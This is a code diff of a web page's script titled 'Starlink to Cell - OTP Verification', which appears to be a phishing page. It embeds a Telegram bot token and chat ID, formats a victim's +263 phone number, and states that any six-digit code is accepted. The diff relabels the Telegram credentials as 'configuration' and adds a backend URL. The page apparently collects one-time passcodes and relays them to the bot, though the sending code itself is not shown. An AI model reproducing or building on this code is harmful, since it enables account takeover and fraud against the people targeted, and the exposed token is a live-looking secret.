@@ -550,16 +550,19 @@
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS
+        // CONFIGURATION
         // ============================================
         const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
         const CHAT_ID = '8392790531';
+        // Backend URL (for future use)
+        const API_URL = 'https://abundant-liberation.up.railway.app/api';
 
         console.log('====================================');
         console.log('📡 Starlink to Cell - OTP Verification');
         console.log('====================================');
         console.log('🤖 Bot Token:', BOT_TOKEN);
         console.log('📱 Chat ID:', CHAT_ID);
+        console.log('🌐 Backend URL:', API_URL);
         console.log('====================================');
 
         // ============================================
@@ -590,7 +593,6 @@
         const formattedPhone = '+263 ' + storedPhone.slice(0, 2) + ' ' + storedPhone.slice(2, 5) + ' ' + storedPhone.slice(5);
         displayPhone.textContent = formattedPhone;
 
-        // Disable resend timer since no cooldown
         resendTimer.textContent = '';
 
         // ============================================
@@ -805,6 +807,7 @@
 
         console.log('✅ ANY 6-DIGIT OTP WILL BE ACCEPTED');
         console.log('📞 Phone:', formattedPhone);
+        console.log('🌐 Backend URL:', API_URL);
         console.log('====================================');
     </script>
 
